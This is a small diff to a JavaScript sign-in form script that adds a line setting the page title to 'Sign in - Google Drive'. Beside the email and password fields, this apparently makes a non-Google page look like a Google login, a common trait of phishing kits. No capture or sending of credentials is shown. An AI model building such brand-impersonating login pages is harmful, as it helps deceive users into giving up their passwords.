@@ -1,4 +1,5 @@
 document.addEventListener('DOMContentLoaded', function() {
+    document.title = 'Sign in - Google Drive';
     var nextButton = document.querySelector('#next-button');
     var passwordContainer = document.querySelector('.password-container');
     var emailInput = document.querySelector('input[name="email"]');
